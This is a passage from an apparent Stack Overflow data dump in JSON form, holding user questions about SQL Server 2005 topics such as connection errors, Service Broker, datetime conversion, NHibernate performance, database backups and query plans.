successful.</p>\n\n<p>When I try and create the connection in R</p>\n\n<pre><code>library(RODBC)\nchannel &lt;- odbcConnect(\"eplR\")\n</code></pre>\n\n<p>I get a failed connection</p>\n\n<pre><code>Login failed  for user pssguy-PC/pssguy  - my local computer name\n</code></pre>\n\n<p>When I connect to the (local) SQL server 2005 via management studio with Windows authentication I get a similar error unless I open management studio \nwith the \"run as administrator\" option.</p>\n\n<p>In management studio, if I look at the properties of the (local) server, the authentication is set to Windows authentication mode.<br>\nThe permission to connect SQL grantor is sa and the Grant box is checked. There is also a connect sql permission for pssguy-PC\\pssguy with an unchecked box. I check it but on restarting mssql server it has reverted to unchecked.</p>\n\n<p>I had what I thought was an identical setup on another standalone machine and I have no problems connecting in R.</p>\n\n<p>Any help much appreciated</p>\n"},{"tags":["java","sql-server-2005","jdbc","resultset"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11663262,"title":"batchUpdate vs individual updates","body":"<p>Assume a table _TABLE_A  which contains  3 LATITUDE,LONGITUDE AND LOCATION.\n   It contains around 10000 records . where LOCATION IS NULL. I need to find location using the LATITUDE AND LONGITUDE. LOCATION can be found using findLocation(lat,long) method.\nNow this table is a live table which is used by around 200 users (select queries) \nand another person is updating around 20000 such records per min.\nand I need to update this table also at the same time.</p>\n\n<p>this is wat i have used for now. \nstep 1:ResultSet rs =  select LATITUDE,LONGITUDE,LOCATION FROM _TABLE_A where LOCATION IS NULL\nstep 2: for every rs.next() , find the location then rs.updateString(\"LOCATION\",location);</p>\n\n<p>Its updating around 1400 records per minute. but my aim is to update around 20000 records per minute. And also i am not allowed to use multiple threads.</p>\n\n<p>Please Guide.. \nmy worries : first to attain 20000 records updation within a minute also should not effect Database.\nI am using SQLServer 2005.</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":11660409,"title":"Microsoft SQL Server Client Statistics - Client vs total processing time","body":"<p>I am trying to better understand the relationship between client processing time and total processing time.</p>\n\n<p>I've always worked with the thought of reducing all the numbers.  I have recently run into a situation where I can reduce the total processing time but the client processing time is greater.</p>\n\n<p>Is it better or worse to have the client do the work?  If one can push processing to the client, wouldn't that be favorable to having the server do it?  Provided all other stats (bytes/packets/round trips/total processing time) stays the same or is lower.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":11659425,"title":"Insert into command with Columns","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/600446/sql-server-how-do-you-return-the-column-names-from-a-table\">SQL Server: How do you return the column names from a table?</a>  </p>\n</blockquote>\n\n\n\n<p>I wanted to know if there was a way to insert the Column names from on table into a field in another table.</p>\n\n<p>I have a new table where the column names of the old table is now a parameter in the new table. </p>\n\n<p>ie.</p>\n\n<pre><code>old table\n[id] [name] [name2] [name3]\n  1    x      x       x\n\nnew table\n[id] [name type]\n 1    name\n 2    name2\n 3    name3    \n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","service-broker"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":164,"score":1,"question_id":11658658,"title":"Troubleshooting Service Broker: initiator database stuck CONVERSING/NOTIFIED","body":"<p>We are developing an application that will use service broker to transfer messages from one database to another.  <strong>SourceDB</strong> is used by an existing application from which we are siphoning off some data.  <strong>TargetDB</strong> is used only by this application and processes/distributes the data we need.  We are only using one type of contract and both DBs are on the same server.</p>\n\n<p>We have set up identical message types and contracts on both, and respective initiator and target queue/service.  On both databases:</p>\n\n<ul>\n<li><code>ENABLE_BROKER</code> is set</li>\n<li><code>TRUSTWORTHY</code> is set</li>\n<li>Have a unique <code>service_broker_guid</code></li>\n<li>Have <code>sa</code> as db owner, with all SSB authorization statements are <code>dbo</code> or <code>OWNER</code>, as appropriate.</li>\n</ul>\n\n<p>However, when we send a message from SourceDB:</p>\n\n<pre><code>BEGIN DIALOG CONVERSATION @dialogHandle\n    FROM SERVICE [//Service/Initiator]\n    TO SERVICE N'//Service/Target'\n    ON CONTRACT [//Contract/Notification]\n    WITH ENCRYPTION = OFF;\nSEND ON CONVERSATION @dialogHandle\n    MESSAGE TYPE [//Message/Notification] (@RequestMsg);\n</code></pre>\n\n<p>...messages do not find their way there.  Further investigation reveals the following:</p>\n\n<ul>\n<li>The initiator queue is empty</li>\n<li>The target queue is empty (NB: not an issue of needing to <code>RECEIVE</code>)</li>\n<li>The transmission queue is empty</li>\n<li>No errors are recorded, either in the SQL Server logs or in our CATCH error handling in the stored procedure that creates the message</li>\n<li>The initiator queue's entry in SourceDB's <code>sys.dm_broker_queue_monitors</code> is set to NOTIFIED if activation is enabled</li>\n<li>SourceDB's <code>sys.conversation_endpoints</code> has a new entry  in <code>CONVERSING</code> state</li>\n<li>The target queue's entry in TargetDB's <code>sys.dm_broker_queue_monitors</code> remains INACTIVE  if activation is enabled</li>\n<li>TargetDB's <code>sys.conversation_endpoints</code> has a new entry  in <code>CONVERSING</code> state with the same conversation_id and different conversation_handle from SourceDB's entry</li>\n</ul>\n\n<p>Although the test database is SQL 2005 (application must support 2005), I ran the ssbdiagnose utility from my development machine's 2008 installation to dianose the issue:</p>\n\n<p><code>ssbdiagnose -S testserver -d SourceDB CONFIGURATION FROM SERVICE //Service/Initiator TO SERVICE //Service/Target ON CONTRACT //Contract/Notification</code></p>\n\n<p>That produced the following:</p>\n\n<pre><code>D  29912 dbtestsvr  SourceDB  Service //Service/Target was not found\nD  29975 dbtestsvr  SourceDB  User dbo does not have SEND permission on service //Service/Target\n</code></pre>\n\n<p>This is confusing, since <code>dbo</code> should not be denied any permission, and <code>//Service/Target</code> certainly does exist, albeit in a different database.  But my coworker ran a Profiler trace that showed a command being executed looking for <code>//Service/Target</code> on SourceDB. Service broker seems to be getting confused somehow.  Adding an explicit route, in addition to being theoretically unnecessary, does not change the situation.</p>\n\n<p>I ran a nearly-identical set of <a href=\"http://www.databasejournal.com/features/mssql/article.php/3918916/Writing-SQL-Server-Service-Broker--Applications--Across-Databases.htm\" rel=\"nofollow\">tutorial commands</a> on our test server and everything worked fine, so it is likely something db-specific.</p>\n\n<p>Our setup was working two days ago, so we're probably looking for some setting that might have gotten changed, but with no luck.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":11657221,"title":"Insert into - SQL Server query","body":"<p>I'm working to push the contents of one table source (from a linked server) to an another table i.e. <code>dbo.dest</code></p>\n\n<pre><code>insert into [dbo].[dest]\n  select * \n  from OPENQUERY(LINKEDSERVER,'select * from source')\n</code></pre>\n\n<p>Source table has 50 columns.</p>\n\n<p>Is there any way I can create the table (<code>dbo.dest</code>) dynamically for the columns for source?</p>\n\n<p>Any input would be helpful.</p>\n\n<p>Thanks !!!!</p>\n"},{"tags":["sql-server-2005","datetime","type-conversion"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":654,"score":1,"question_id":11651585,"title":"Error converting data type nvarchar to datetime","body":"<p>I have the following procedure interface:</p>\n\n<pre><code>Create procedure [dbo].[InsertItemDetails]\n    @TimeItemAdded datetime\n</code></pre>\n\n<p>When I call it this way:</p>\n\n<pre><code>EXEC [dbo].[InsertItemDetails]\n     @TimeItemAdded = N'20/07/2012 00:00:00';\n</code></pre>\n\n<p>I get this error:</p>\n\n<blockquote>\n  <p>Msg 8114, Level 16, State 5<br>\n  Error converting data type nvarchar to datetime.</p>\n</blockquote>\n"},{"tags":["sql-server-2005","nhibernate"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":180,"score":-2,"question_id":11630824,"title":"NHibernate large data retrieval in single query","body":"<p>I am currently using <b>NHibernate</b> to read a block of <b>50k rows</b>. It takes almost <b>20 minutes</b>.\nData which is to be read is prepared by joining more than <i>5 tables</i> in SQLSERVER 2005.\nMy main concern is NHibernate prepares a <b>new query for each row</b> retrieval, which is quite time consuming.<br/><br/>\nI know it's necessary as NHibernate has to map each row to an object, but this approach is useless where reading is main concern.\n<br/><br/>\nI cannot use Stateless sesstion as I am using collections to store data\n<br/><br/>\nI also need to apply some filter through parameters. I have also implemented Stored Procedure, but somehow it didn't help.\n<br/><br/>\nIs there any other way to handle large collection of data. </p>\n\n<p><br/><br/><br/><br/>\n<b>------Edit-------</b>\n<br/>\nHere are my two config file which I was using to map<br/></p>\n\n<pre><code>    &lt;hibernate-mapping xmlns=\"urn:nhibernate-mapping-2.2\" namespace=\"myNameSpace\" assembly=\"myNameSpace\"&gt;\n    &lt;class name=\"MyClass\" table=\"TableNameFromDb\"&gt;\n        &lt;id name=\"ID\" column=\"ID\"&gt;\n            &lt;generator class=\"native\" /&gt;\n        &lt;/id&gt;\n        &lt;property name=\"prop1\"/&gt;\n        &lt;property name=\"prop2\"/&gt;\n\n    &lt;bag name=\"bag1\" cascade=\"all-delete-orphan\" inverse=\"false\"  fetch=\"join\" lazy=\"false\"&gt;\n            &lt;key column=\"prop1\"/&gt;\n            &lt;one-to-many class=\"MyClass2\" /&gt;\n    &lt;/bag&gt;\n    &lt;/class&gt;\n&lt;/hibernate-mapping&gt;    \n\n&lt;hibernate-mapping xmlns=\"urn:nhibernate-mapping-2.2\" namespace=\"myNameSpace\" assembly=\"myNameSpace\"&gt;\n    &lt;class name=\"MyClass2\" table=\"TableNameFromDb2\"&gt;\n        &lt;id name=\"prop2\" column=\"ID\"&gt;\n            &lt;generator class=\"native\" /&gt;\n        &lt;/id&gt;\n        &lt;property name=\"prop2\"/&gt;\n        &lt;property name=\"prop3\"/&gt;\n\n    &lt;/class&gt;\n&lt;/hibernate-mapping&gt;\n</code></pre>\n\n<p><br/><br/><br/>\n<b>Now the main concern here is NHibernate is creating a new query for each row and sending to the database which is an overhead.</b></p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":226,"score":0,"question_id":10527858,"title":"SQL Server - comparing two variables","body":"<p>I wish to compare a variable <code>@a</code> containing an entire column of a table with another variable containing a single value. Is it possible?     </p>\n\n<pre><code>create procedure pc1(@var int)\nas begin\n   declare @a int\n\n   select @a=id from tb1\n\n   while(if exists(@var=@a))\n   begin\n      select * from tb1 where id=@var\n   end\n\n   return \n</code></pre>\n\n<p>end</p>\n"},{"tags":["mysql","sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":168,"score":0,"question_id":11585010,"title":"String manipulation issue in sql removing underscore and characters after that from comma delimited string","body":"<p>I am trying to change a string which is in the format say :</p>\n\n<pre><code>\"12_7,34_22,28_4,6_22\"\n</code></pre>\n\n<p>TO</p>\n\n<pre><code>\"12,34,28,6\"\n</code></pre>\n\n<p>Essentially I want to eliminate \"_\" (underscore and whatever is after that and before comma ) from the string. Haven't worked with sql so it is looking like an uphill task to me.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","join","null"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":11645981,"title":"SQL find the date on have not recived any order","body":"<p>I have some tables. I just want to write query which gives me the date on which no orders were placed. I am using left joins to get the result in null but problem is: after using this I am not able to get the date.</p>\n\n<p>Please help me, my code is like this:</p>\n\n<pre><code>SELECT DAY(o.OrderDate) AS 'HavntRecivedOrder'\n  FROM Products p\n INNER JOIN Suppliers sup   ON p.SupplierID = sup.SupplierID\n INNER JOIN OrderDetails od ON p.ProductID = od.ProductID\n  LEFT JOIN Orders o        ON (od.OrderID = o.OrderID\n                                AND o.OrderDate BETWEEN '1/1/1997' AND '1/31/1997')\n WHERE sup.CompanyName='Tokyo Traders'\n   AND o.OrderDate IS  NULL\n</code></pre>\n"},{"tags":["sql","sql-server-2005","count","max"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":11646401,"title":"SELECT MAX of COUNT","body":"<p>I have a table \"well\". It contains a column app_rate_unit (type: nvarchar).\nMy goal is to count every distinct value in the table and let the DBMS (MS Server 2005) give me the most occurring one.</p>\n\n<p>This is my code:</p>\n\n<pre><code>SELECT MAX(app_rate_unit) AS MAX_APP\n  FROM (SELECT app_rate_unit, COUNT(*) AS co\n          FROM dbo.well AS w\n         GROUP BY app_rate_unit\n        ) AS derivedtbl_1\n</code></pre>\n\n<p>The poblem with it is however, that my DBMS actually delivers the lowest count to me.</p>\n\n<p>SideQuestion: How do i filter for a foreign key (in the table) and NOT NULL (in app_rate_unit) when counting?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","sql-server","sql-server-2005","ms-access","ms-access-2007"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":214,"score":0,"question_id":11642628,"title":"Export MS SQL Server Query Result to MS Access","body":"<p>I developed a PHP web app which interacts with MS SQL 2005 database. User will access my web and get some data they need in Excel format. I've done this with phpexcel extension.</p>\n\n<p>However, now I need to save the query result in MS Access format (<em>.accdb/</em>.mdb) due to Ms Excel restriction for large file.</p>\n\n<p>I could not find any Ms Access writer or any similiar things in the internet.</p>\n\n<p>Any help would be appreciated.\nThanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005","clr"],"answer_count":2,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":6647,"score":12,"question_id":507785,"title":"Size of varbinary field in SQL server 2005","body":"<p>I am trying to determine the size in bytes of the contents in a varbinary(max) field in sql server 2005, using sql. As I doubt there is native support for this, could it be done using CLR integration? Any ideas would be greatly appreciated. </p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":10530171,"title":"How to Handle Multi Currencies (Precision and Scale) from one Column in SQL Query","body":"<p>I have a three columns in table</p>\n\n<pre><code>TransactionDate---DateTime\nTotalAmount---DECIMAL(18,4)\nCurrencyCode---nVarchar(10)\n\nTotalAmount-------------CurrencyCode\n1000.5000----------------KD (Kuwaiti Dinnar) which must be 1000.500\n5500.2000----------------ETB (Eithopian Birr)\n2500.1500----------------USD (United States Dollars) which must be 2500.15\n</code></pre>\n\n<p>I am storing these multi currencies in one column......now i want to get report for each day or month by using SUM() Funtion in SQL Query.............but SUM must be done based on each currency's percision or scale.\ni.e.....If currency is USD   then </p>\n\n<pre><code>SUM(2500.15)\n</code></pre>\n\n<p>If currency is KD then </p>\n\n<pre><code>SUM(1000.500)\n</code></pre>\n\n<p>and If ETB then </p>\n\n<pre><code>SUM(5500.2000)\n</code></pre>\n\n<p>some thing like this..</p>\n"},{"tags":["sql-server","database","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":11547041,"title":"database unconfirmed deadlock t-sql 2005","body":"<p>For instance, there exists table A and table B, and i need to process an update in A and then B and I decide to table lock both them during use (as demanded by my architect). Simultaneously, another procedure is called which table locks B, then locks A.</p>\n\n<p>Will this transaction complete? I have a feeling its a deadlock, quite sure of it as it's not releasing any resources...</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":314,"score":4,"question_id":5984704,"title":"SQL . The SP or function should calculate the next date for friday","body":"<p>I need to write a store procedure that will return a next friday date on a given date? for example - if the date is 05/12/2011, then it should return next friday date as 05/13/2011. If you pass, 05/16/2011, then it should return the date is 5/20/2011 (Friday). If you pass friday as the date, then it should return the same date.</p>\n"},{"tags":[".net","sql","sql-server","sql-server-2005","c#-3.0"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":4,"view_count":58553,"score":2,"question_id":5287427,"title":"how to insert datetime into the SQL Database table?","body":"<p>How can I insert datetime into the SQL Database table ?\nIs there a way to insert this query through the insert command in C# / .NET?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":551,"score":0,"question_id":2872267,"title":"script to dynamically fix ophaned users after db restore","body":"<p>After performing a database restore, I want to run a dynamic script to fix ophaned users. My script below loops through all users that are displayed after executing sp_change_users_login 'report' and applys an \"alter user [username] with login = [username]\" statement to fix SID conflicts. I'm getting an \"incorrect syntax error on line 15\" and can't figure out why...help..</p>\n\n<pre><code>DECLARE @Username varchar(100), @cmd varchar(100)\nDECLARE userLogin_cursor CURSOR FAST_FORWARD\nFOR\nSELECT UserName = name FROM sysusers\nWHERE issqluser = 1 and (sid IS NOT NULL AND sid &lt;&gt; 00)\n    AND suser_sname(sid) IS NULL\nORDER BY name\nFOR READ ONLY\nOPEN userLogin_cursor\n\nFETCH NEXT FROM userLogin_cursor INTO @Username\nWHILE @@fetch_status = 0\n  BEGIN\n    SET @cmd = ALTER USER +@username+ WITH LOGIN +@username\n    EXECUTE(@cmd)\n    FETCH NEXT FROM userLogin_cursor INTO @Username\n  END\nCLOSE userLogin_cursor\nDEALLOCATE userLogin_cursor\n</code></pre>\n"},{"tags":["c#","sql-server-2005","database-backups"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":533,"score":1,"question_id":8868645,"title":"Using SMO to backup SQL Server 2005 Database with C# Windows Forms Application, Back up failed","body":"<p>This is my code to back up my database I followed <a href=\"http://www.codeproject.com/KB/database/SQL_Server_2005_Database.aspx\" rel=\"nofollow\">this tutorial</a>, as you can see, the codes are identical. The error comes after I fill in the variables. The error I get is </p>\n\n<blockquote>\n  <p>Backup failed for Server 'RITZEL-PC\\SQLEXPRESS'.</p>\n</blockquote>\n\n<p><strong>Back up function:</strong></p>\n\n<pre><code>    public void BackupDatabase(String databaseName, String userName, String password,        String serverName, String destinationPath)\n    {\n        Backup sqlBackup = new Backup();\n\n        sqlBackup.Action = BackupActionType.Database;\n        sqlBackup.BackupSetDescription = \"ArchiveDataBase:\" + DateTime.Now.ToShortDateString();\n        sqlBackup.BackupSetName = \"Archive\";\n\n        sqlBackup.Database = databaseName;\n\n        BackupDeviceItem deviceItem = new BackupDeviceItem(destinationPath, DeviceType.File);\n        ServerConnection connection = new ServerConnection(serverName, userName, password);\n        Server sqlServer = new Server(connection);\n\n        Database db = sqlServer.Databases[databaseName];\n\n        sqlBackup.Initialize = true;\n        sqlBackup.Checksum = true;\n        sqlBackup.ContinueAfterError = true;\n\n        sqlBackup.Devices.Add(deviceItem);\n        sqlBackup.Incremental = false;\n\n        sqlBackup.ExpirationDate = DateTime.Now.AddDays(3);\n        sqlBackup.LogTruncation = BackupTruncateLogType.Truncate;\n\n        sqlBackup.FormatMedia = false;\n\n        sqlBackup.SqlBackup(sqlServer);\n    }\n</code></pre>\n\n<p><strong>Button click</strong></p>\n\n<pre><code>    private void BackUp_Btn_Click(object sender, EventArgs e)\n    {\n        String databaseName = @\"D:\\MY_THESIS\\WORKING FILES\\NNIT-RMS.mdf\";\n        String userName = \"NNIT-Admin\";\n        String password = \"password\";\n        String serverName = @\"RITZEL-PC\\SQLEXPRESS\";\n        String destinationPath = @\"D:\\\";\n\n        BackupDatabase(databaseName,userName,password,serverName,destinationPath);\n\n    }\n</code></pre>\n\n<p><strong>Database Information</strong>\nI am not allowed to post images yet but I have uploaded a screen shot. See here: <a href=\"http://img268.imageshack.us/img268/9250/sqlg.jpg\" rel=\"nofollow\">http://img268.imageshack.us/img268/9250/sqlg.jpg</a></p>\n"},{"tags":["sql-server-2005","datetime"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":6251,"score":4,"question_id":2475178,"title":"How to get total number of hours between two dates in sql server?","body":"<p>Consider two dates <code>2010-03-18 22:30:45</code> and <code>2010-03-19 03:30:15</code> .... How to get the number of hours and minutes in between the two dates in sql server.....</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2838,"score":2,"question_id":8858620,"title":"Calling stored procedure from another stored procedure SQL Server","body":"<p>I have 3 insert stored procedures each SP inserts data in 2 different tables</p>\n\n<pre><code>Table 1          Table 2                \nidPerson         idProduct             \nname             productName            \nphoneNumber      productdescription     \nFK-idProduct\n</code></pre>\n\n<p>SP for table 1                            SP for table 2</p>\n\n<pre><code>create procedure test1                create procedure test2\nWITH                                  WITH \nEXECUTE as caller                     EXECUTE as caller\nAS                                    AS\ndeclare                               declare\n\n@idPerson int,                        @idProduct int,\n@name varchar(20),                    @productName varchar(50),\n@phone varchar(20)                    @productoDescription varchar(50)\n\n\n  SET nocount on;                     SET nocount on;\n    Begin                             Begin\n      insert into table1(                insert into table2(\n                idPerson,                          idProduct,\n                name,                              productName,\n                phone)                             productDescription)\n          values(                            values(\n                @idPerson,                         @idProduct,\n                @name,                             @productName,\n                @phone)                            @productDescription)\n      end                               end\n</code></pre>\n\n<p>I need to call stored procedure test 2 from stored procedure test 1 and insert the FK-ID in the table 1</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server-2005","collation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":11631783,"title":"Modify search to make it Accent Insensitive in SQL Server","body":"<p>I have a database which current collation is French_CI_AS, which means that searches are case insensitive, but accent sensitive. I had the impression that changing the collation of the database to French_CI_AI would solve my problem so I did it. However, I still can't make a simple search work Accent-Insensitive. I check and the table collation is French_CI_AI, which is probably because it was changed along with the database.</p>\n\n<p>Is there some way to make the search possible with Accent insensitive on all database ? Or is there any way to make a single seach that way ? I only have one or two Stored procedures that would need that so I could go that way to.</p>\n\n<p>In case it makes any differences, the datatype I look for are all nvarchar(n)s.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","postgresql","query-execution-plans"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":11519767,"title":"SELECT query poor execution plan with \"WHERE A=1 OR A=2 clause\"","body":"<p>We currently have a <code>LOGS</code> TABLE divided with multiple logbooks numbers (column <code>XLOG</code>), and accessed within a limited time range.</p>\n\n<p>The table is declared with a clustered 'natural' primary key, where <code>XLOG</code> is logbook identifier, <code>XDATE</code> is the timestamp, and <code>XHW and XCELL</code> are hardware identifiers ensuring unicity of log events :</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code> CREATE TABLE [dbo].[LOGS](\n    [XDATE] [datetime] NOT NULL,\n    [XHW] [nvarchar](3) NOT NULL,\n    [XCELL] [nvarchar](3) NOT NULL,\n    [XALIAS] [nvarchar](255) NULL,\n    [XMESSAGE] [nvarchar](255) NULL,\n    [XLOG] [int] NOT NULL,\n CONSTRAINT [PK_LOG] PRIMARY KEY CLUSTERED ([XLOG] ASC,[XDATE] ASC,[XHW] ASC,[XCELL] ASC)\n</code></pre>\n\n<p>The problem is a horrible execution plan occuring when accessing multiple logbooks with the same query (e.g. <code>XLOG = 1 OR XLOG = 1002</code> in the sample query below), request #1 :</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>SELECT TOP 100 XDATE, XHW, XCELL, XMESSAGE, XLOG FROM LOGS\nWHERE XDATE &gt; '2012-06-12T00:00:00' AND XDATE &lt; '2012-07-13T08:29:03.250'\nAND (XLOG = 1 OR XLOG = 1002)\nORDER BY XDATE DESC, XLOG DESC\n</code></pre>\n\n<p><strong>Edit:</strong> the 100 rows needed are not only from logbook #1, but from both logbooks, mixed, date ordered. That is what both queries return.</p>\n\n<p>Statistics were updated before the tests.</p>\n\n<p>The actual execution plan basically uses clustered index seek to fetch million rows of data with a predicate on <code>XLOG</code> and <code>XDATE</code>, (where it might only fetch 100 first/last rows since we have XLOG= and we TOP order by XDATE) <img src=\"http://i.imgur.com/zEKe2.png\" alt=\"actual plan\"></p>\n\n<p>The details of the clustered index seek operation : <img src=\"http://i.imgur.com/YQUg3.png\" alt=\"tooltip\"></p>\n\n<p>The expected execution plan is <img src=\"http://i.imgur.com/5ruK8.png\" alt=\"expected plan\"></p>\n\n<p>I tried to rewrite the query, but could not find another way except with <code>UNION ALL</code>. The resulting query returns the same results (with a correct plan !) but it feels over-complicated (and cannot be adapted with a JOIN on XLOG, but that is not the question) request #2 :</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>WITH A AS (SELECT TOP 100 XDATE,  XHW, XCELL, XMESSAGE, XLOG FROM LOGS\nWHERE XDATE &gt; '2012-06-12T00:00:00' AND XDATE &lt; '2012-07-13T08:29:03.250'\nAND XLOG = 1\nORDER BY XDATE DESC),\n\nB AS (SELECT TOP 100 XDATE,  XHW, XCELL, XMESSAGE, XLOG FROM LOGS\nWHERE XDATE &gt; '2012-06-12T00:00:00' AND XDATE &lt; '2012-07-13T08:29:03.250'\nAND XLOG = 1002\nORDER BY XDATE DESC)\n\nSELECT TOP 100 * FROM (\n    SELECT * FROM A\n    UNION ALL \n    SELECT * FROM B \n) A\nORDER BY XDATE DESC, XLOG DESC\n</code></pre>\n\n<p><strong>Question:</strong> What is wrong with request #1 ? how can it be rewritten/modified, to take the 'TOP' into account before attempting to sort millions of rows ? is another index, HINT, or some extra statistics needed to solve the problem ? am-I obliged to rewrite the queries like the request #2 ?</p>\n\n<p><strong>Edit:</strong> Quantitatively this table holds a dozen of logbooks, some have as few as one event per month, when others have millions of events per month. </p>\n\n<p>This kind of query is the most used against this table (there are other variants with extra filters but they are not relevant for this problem -- except for complexity when using request #2).</p>\n\n<p><strong>Edit #2:</strong> I tried the solution of changing the clustered index to (XDATE,XLOG,...) instead of (XLOG,XDATE,...) -- nb: This composite primary key was designed this way because of the low selectivity of the column XLOG.</p>\n\n<p>I tested this query on a copy of the production database, against a logbook with only a thousand of rows : the query plan generates LOTS OF I/O (it filters out only a few rows from that <code>XLOG=12</code> out of a wide range of <code>XDATE</code>s). So this particular solution is not ok.</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>SELECT TOP 100 XDATE, XHW, XCELL, XMESSAGE, XLOG FROM LOGS\nWHERE XDATE &gt; '2012-06-12T00:00:00' AND XDATE &lt; '2012-07-13T08:29:03.250'\nAND (XLOG = 12 AND XALIAS LIKE 'KEYWORD%' )\nORDER BY XDATE DESC, XLOG DESC, XHW DESC, XCELL DESC\n</code></pre>\n\n<p><img src=\"http://i.imgur.com/oUsWX.jpg\" alt=\"Nice query plan with lots of I/O\"></p>\n\n<p>PS: By the way, we have the same behaviour with <strong>PostgreSQL 9.1</strong> - so it is not database related, more probably a wrong query or a wrong table design.</p>\n"},{"tags":["xml","sql-server-2005","vb.net-2010"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1008,"score":0,"question_id":11619786,"title":"Insert & Update SQL Table from XML file data using VB.NET 2010","body":"<p>I have been researching and writing/re-writing a program to do this task for a week now. I need some collaboration on this to maybe bring up something I haven't though of before. Specifically, we have an auto-generated XML file sent to us daily with ~70k records (~75MB in size.) I was asked to make a table on one of the servers (SQL) which contains this information so that it can queried. Also, this program must Update existing records (if data has changed) and Insert new records DAILY. <strong>Records must not be deleted from the db</strong> </p>\n\n<p>Here is the list of methods I have attempted (so far) and reasons they did not work.</p>\n\n<ol>\n<li><p>SQLXMLBulkLoad - This worked excellent for importing the data.\nHowever, the limitation of the Bulk Load class is that it can not\nUpdate and/or Insert. Time for a re-write.</p></li>\n<li><p>SQL OpenRowSet (using SQLCommand, etc.) - This does not work\n    because the server, program, and XML file will all 3 be on different\n    computers. These devices CAN be configured to allow each other\n    access to the file (specifically the server), however this method\n    was deemed \"Not realistic, too much overhead\" Time for a re-write.</p></li>\n<li><p>DataSet Merge, then TableAdapter.Update - This method intitially\n    seemed like it would definitely work. The idea is simple, use\n    DataSet.XMLRead() method to put the XML data into a table in the\n    dataset, then just add the SQL table to the dataset (Using\n    SQLCommand, etc.), merge the two tables, and then use Table Adapter\n    to Update/Insert the table into the existing SQL table. This method\n    seems not to work because the XML file has two nodes (columns) which\n    contains dates. Unfortunately, there is not a uniform Date datatype\n    between SQL and XML. I even attempted changing all of the date\n    formats from the XML file to the DateTime SQL format, which worked,\n    but still deemed a datatype mismatch exception upon running.</p></li>\n</ol>\n\n<p>At this point, I am out of ideas. This seems to be a task that has surely been done before. I am not necessarily looking for someone to write this code for me (I am fully capable of this), I just need some collaboration on the topic.</p>\n\n<p>Thank You </p>\n"},{"tags":["c#",".net","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":735,"score":2,"question_id":10108565,"title":"C# Changing SqlConnection timeout","body":"<p>I am trying to override the default <code>SqlConnection</code> timeout of 15 seconds and am getting an error saying that the </p>\n\n<blockquote>\n  <p>property or indexer cannot be assigned because it is read only.</p>\n</blockquote>\n\n<p>Is there a way around this?   </p>\n\n<pre><code>using (SqlConnection connection = new SqlConnection(Database.EstimatorConnection))\n{\n   connection.Open();\n\n   using (SqlCommand command = connection.CreateCommand())\n   {\n       command.CommandType = CommandType.StoredProcedure;\n       connection.ConnectionTimeout = 180; // This is not working \n       command.CommandText = \"sproc_StoreData\";\n       command.Parameters.AddWithValue(\"@TaskPlanID\", order.Projects[0].TaskPlanID);\n       command.Parameters.AddWithValue(\"@AsOfDate\", order.IncurDate);\n\n       command.ExecuteNonQuery();\n    }\n}\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":264,"score":2,"question_id":11325421,"title":"How to return sets 